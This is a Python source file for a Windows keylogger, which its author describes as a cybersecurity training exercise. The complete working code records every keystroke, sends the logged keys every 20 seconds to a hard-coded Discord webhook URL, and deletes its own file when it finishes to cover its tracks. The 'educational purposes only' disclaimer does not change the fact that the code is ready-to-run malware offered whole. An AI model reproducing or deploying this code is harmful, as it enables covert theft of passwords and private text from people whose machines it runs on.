"""
    Experimental keylogger program (v1.0)
    -------------------------------------------------------------------

    In the scope of our cybersecurity training, we were asked to design
    a small keylogger program in Python. Program's objectives are:

        - Collect data typed on user's keyboard
        - Send collected data on a external server
        - Make use of threads for parallel execution
        - The program destroys itself upon completion

    This program specifically targets machines running on Windows.

    -------------------------------------------------------------------
    This program has been designed for educational purposes only.
    I am NOT responsible for any damage caused by misuse or malicious
    utilization of this program.

    Please read this article to know more about legal considerations:
    https://crowdstrike.com/en-us/cybersecurity-101/cyberattacks/keylogger/

    Made with Python 3.13.2
    © 2025 Sacha Meurice
"""

import os, requests, threading as th
from pynput import keyboard
from time import sleep



# Maximum execution time of the program in minutes.
MAX_TIME = 5

# Periodic data sending time in seconds.
SEND_TIME = 20

# Discord webhook URL
DISC_WB = 'https://discord.com/api/webhooks/1349645375513952298/8ZCMY9gSuJGlOEakBih5tpY_PBztN5pNp_k3PurM4KB1WM0agBgLJv-ecM3VOJSjHd-7'

# Buffer that logs key events.
BUFF_SZ = 256
logsBuffer = ""

# Lock used to manage shared resources between threads.
th_lock = th.Lock()



def selfDestroy():
    """Delete program's files upon completion."""
    os.system(f"del {__file__}")



def sendData(data):
    """Send collected data to a Discord server."""
    msgParam = {
        'content': data,
        'username': 'Logger'
    }

    try:
        response = requests.post(DISC_WB, json=msgParam)
        if response.status_code != 204:
            print(f"ERROR: Could not send data to the server [status code {response.status_code}]")

    except Exception as e:
        print("Error with request:", e)



def on_press(key):
    """Function excuted when a key is pressed."""
    global logsBuffer

    if hasattr(key, 'char') and key.char is not None:
        keyPressed = key.char
    else:
        keyPressed = f"[{key}]"  # Indicate special keys


    with th_lock:
        if len(logsBuffer) + len(keyPressed) <= BUFF_SZ:
            logsBuffer += keyPressed
            return

        sendData(logsBuffer)
        logsBuffer = keyPressed



def regularSending():
    """Send buffer data to the Discord server each SEND_TIME seconds."""
    global logsBuffer
    while True:
        sleep(SEND_TIME)

        with th_lock:
            if len(logsBuffer) > 0:
                sendData(logsBuffer)
                logsBuffer = ""



if __name__ == '__main__':
    try:
        thread = th.Thread(target=regularSending, daemon=True)
        thread.start()

        # Start logging keys for the specified amount of time
        with keyboard.Listener(on_press=on_press) as listener:
            sleep(60 * MAX_TIME)

    except Exception as e:
        print("Unexcepted error:", e)
    finally:
        selfDestroy()
